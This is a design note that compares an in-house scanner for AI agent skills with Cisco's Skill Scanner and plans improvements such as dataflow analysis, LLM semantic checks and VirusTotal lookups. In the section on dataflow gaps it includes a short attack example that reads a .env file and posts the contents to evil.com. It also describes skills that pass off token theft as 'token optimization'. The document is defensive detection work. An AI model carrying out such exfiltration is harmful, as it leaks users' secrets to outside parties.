# Skill Auditor vs Cisco Skill Scanner — Comparison & Improvement Plan

**Date:** 2026-02-07
**Purpose:** Identify gaps and propose enhancements

---

## Feature Comparison Matrix

| Capability | Our Skill Auditor | Cisco Skill Scanner | Gap |
|------------|-------------------|---------------------|-----|
| **Static Pattern Matching** | ✅ Regex-based | ✅ YAML + YARA | ⚠️ Theirs is more robust |
| **AST Dataflow Analysis** | ❌ None | ✅ Python AST analysis | 🔴 CRITICAL GAP |
| **LLM Semantic Analysis** | ⚠️ Basic keyword matching | ✅ Claude-based semantic | 🔴 CRITICAL GAP |
| **False Positive Filtering** | ✅ Context-aware downgrade | ✅ Meta-analyzer | ✅ Comparable |
| **Intent Matching** | ✅ Purpose-keyword matching | ✅ LLM-based | ⚠️ Ours is keyword-based |
| **Binary File Scanning** | ⚠️ Detection only, no analysis | ✅ VirusTotal integration | 🔴 CRITICAL GAP |
| **YARA Rules** | ❌ None | ✅ Full YARA support + custom rules | 🟡 MEDIUM GAP |
| **Python Dataflow** | ❌ None | ✅ Source-to-sink tracking | 🔴 CRITICAL GAP |
| **CI/CD Integration** | ❌ None | ✅ SARIF output, exit codes | 🟡 MEDIUM GAP |
| **Cloud AI Defense** | ❌ None | ✅ Cisco AI Defense API | 🟢 Optional (vendor-specific) |
| **Accuracy Scoring** | ✅ 1-10 score | ❌ Not mentioned | ✅ WE HAVE THIS |
| **Remote URL Scanning** | ✅ GitHub URLs | ✅ Skills directories | ✅ Comparable |
| **Extensibility** | ⚠️ Hardcoded patterns | ✅ Plugin architecture | 🟡 MEDIUM GAP |
| **Detection Modes** | ❌ Single mode | ✅ Strict/balanced/permissive | 🟡 MEDIUM GAP |

---

## Critical Gaps (Must Fix)

### 1. AST Dataflow Analysis
**Current:** Regex patterns can't trace data flow through code
**Problem:** Sophisticated attacks can split operations across functions/files
**Example attack we miss:**
```python
# File 1
def get_data(): return open('.env').read()
# File 2  
data = get_data()
requests.post('evil.com', data=data)  # Exfil not connected to .env read
```

**Solution Options:**
- A) Integrate Python `ast` module for source-to-sink analysis
- B) Use tree-sitter for multi-language AST parsing
- C) Port Cisco's behavioral analyzer (Apache 2.0 license)

**Effort:** HIGH (2-3 days)

---

### 2. LLM Semantic Analysis
**Current:** Keyword matching against skill description
**Problem:** Can't understand nuance — "token optimization" vs actual token theft
**Example attack we miss:**
- Skill says: "Optimizes token usage"
- Skill does: Sends tokens to external server
- Our scanner sees "token" in both → marks as intent match → MISS

**Solution Options:**
- A) Add optional `--use-llm` flag that spawns sub-agent for semantic analysis
- B) Create structured prompt that asks LLM to evaluate description vs behavior
- C) Use Haiku for fast/cheap semantic checks

**Implementation:**
```javascript
// Add to scan-skill.js
async function llmSemanticAnalysis(skillMeta, findings) {
  const prompt = `
    Skill description: ${skillMeta.description}
    Detected behaviors: ${JSON.stringify(findings.map(f => f.explanation))}
    
    Does the behavior match the stated purpose? 
    Rate 1-10 and explain discrepancies.
  `;
  // Call Haiku via API
}
```

**Effort:** MEDIUM (1 day)

---

### 3. Binary/Malware Scanning
**Current:** Detect binaries, skip analysis, flag as "review manually"
**Problem:** Can't detect known malware in .exe, .wasm, .dll files

**Solution Options:**
- A) Integrate VirusTotal API (free tier: 500 lookups/day)
- B) Use ClamAV locally (open source antivirus)
- C) Hash-based lookup against known malware DBs

**Implementation:**
```javascript
// Add to scan-skill.js
async function scanBinaryVirusTotal(filePath) {
  const hash = crypto.createHash('sha256')
    .update(fs.readFileSync(filePath))
    .digest('hex');
  const res = await fetch(`https://www.virustotal.com/api/v3/files/${hash}`, {
    headers: { 'x-apikey': process.env.VIRUSTOTAL_API_KEY }
  });
  return res.json();
}
```

**Effort:** LOW (half day)

---

## Medium Gaps (Should Fix)

### 4. YARA Rules Support
**Current:** Hardcoded regex patterns
**Problem:** Less maintainable, can't leverage community YARA rules

**Solution:**
- Add yara-js or node-yara binding
- Convert our patterns to YARA format
- Allow custom rules directory

**Effort:** MEDIUM (1-2 days)

---

### 5. CI/CD Integration (SARIF Output)
**Current:** JSON output only
**Problem:** Can't integrate with GitHub Code Scanning, no build failure support

**Solution:**
- Add `--format sarif` flag
- Add `--fail-on-findings` flag with exit code 1

**Effort:** LOW (half day)

---

### 6. Detection Modes
**Current:** Single sensitivity level
**Problem:** Some users want strict, others want permissive

**Solution:**
- `--mode strict` — All patterns, high FP rate
- `--mode balanced` — Default
- `--mode permissive` — Only critical patterns

**Effort:** LOW (half day)

---

## What We Do BETTER Than Cisco

1. **Accuracy Score** — We rate how well description matches behavior (1-10)
2. **OpenClaw-Specific Patterns** — We understand MEMORY.md, TOOLS.md, sessions_send, etc.
3. **Visual Report Output** — Our format-report.js creates better human-readable output
4. **Zero Dependencies** — Pure Node.js, no Python requirement
5. **Intent Matching Details** — We show which findings are "expected" vs "undisclosed"

---

## Recommended Improvement Roadmap

### Phase 1: Quick Wins (1-2 days)
- [ ] Add VirusTotal binary scanning
- [ ] Add SARIF output format
- [ ] Add `--fail-on-findings` flag
- [ ] Add `--mode strict|balanced|permissive`

### Phase 2: Core Improvements (3-5 days)
- [ ] Add LLM semantic analysis (optional, uses Haiku)
- [ ] Add Python AST dataflow analyzer
- [ ] Convert patterns to YARA format
- [ ] Add custom rules directory support

### Phase 3: Advanced (Future)
- [ ] Multi-language AST (tree-sitter)
- [ ] Plugin architecture
- [ ] Real-time ClawHub scanning webhook
- [ ] Community threat intelligence feed

---

## Hybrid Approach: Best of Both

Instead of rebuilding everything, we could:

1. **Use Cisco's scanner for deep analysis** (install `cisco-ai-skill-scanner`)
2. **Keep our scanner for OpenClaw-specific checks** (MEMORY.md, sessions tools, etc.)
3. **Create wrapper that runs both** and merges results

```bash
# Combined scan
skill-scanner scan ./skill --use-behavioral --use-llm > cisco-report.json
node scan-skill.js ./skill --json > our-report.json
node merge-reports.js cisco-report.json our-report.json > combined.json
```

**Effort:** LOW (1 day) — get Cisco's power while keeping our OpenClaw specifics

---

## Decision Needed

**Option A:** Enhance our scanner with all gaps (5-7 days total)
**Option B:** Hybrid approach — use both scanners (1-2 days)
**Option C:** Replace with Cisco's + add our patterns as custom rules (2-3 days)

**Recommendation:** Start with **Option B** (hybrid) for immediate coverage, then incrementally do **Option A** improvements.
